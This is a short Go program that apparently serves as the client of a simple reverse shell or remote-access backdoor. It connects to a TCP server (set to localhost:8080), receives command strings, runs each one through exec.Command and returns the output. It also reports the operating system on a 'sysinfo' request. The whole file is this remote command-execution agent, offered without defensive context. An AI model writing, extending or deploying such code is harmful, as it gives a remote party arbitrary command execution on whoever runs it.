package main

import (
	// Standard
	//"bufio"
	"strings"
	"fmt"
	"encoding/gob"
	"log"
	"net"
	"os/exec"
	"runtime"
)


func main() {

	conn, err := net.Dial("tcp", "localhost:8080")

	if err != nil {
		log.Fatal("Connection failled with", err)
	}

	cmd := ""
	dec := gob.NewDecoder(conn)

	for cmd != "close" {

		//cmd, _ = bufio.NewReader(conn).ReadString('\n')

		dec.Decode(&cmd)
		cmd = strings.TrimSuffix(cmd, "\n")
			
	
		switch {
		case cmd == "close":
			break

		case cmd == "sysinfo":
			osType := runtime.GOOS
			fmt.Fprintf(conn, osType)

		default:
			out, err := exec.Command(cmd).Output()
		
			if err != nil {
				fmt.Println("", err)
			}

			output := string(out[:])
			fmt.Fprintf(conn, output)
		}	
	}
	conn.Close()
}
